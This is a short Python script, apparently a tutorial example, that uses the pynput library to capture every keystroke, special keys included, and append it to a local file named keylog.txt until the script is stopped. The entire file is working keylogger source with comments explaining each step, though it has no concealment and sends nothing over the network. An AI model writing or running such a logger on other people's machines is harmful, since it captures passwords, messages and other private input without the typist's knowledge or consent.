from pynput import keyboard

# Definig a function to log the pressed keys
def on_press(key):
    try:
        # Writing the pressed key to a log file
        with open("keylog.txt", "a") as log_file:
            log_file.write(str(key.char))
    except AttributeError:
        # Handling special keys (e.g., Shift, Ctrl, etc.)
        with open("keylog.txt", "a") as log_file:
            log_file.write(f" [{key}] ")

# Creating a listener for keyboard events
listener = keyboard.Listener(on_press=on_press)

# Starting the listener to begin logging keystrokes
listener.start()

# Keeping the script running to continue logging until interrupted
listener.join()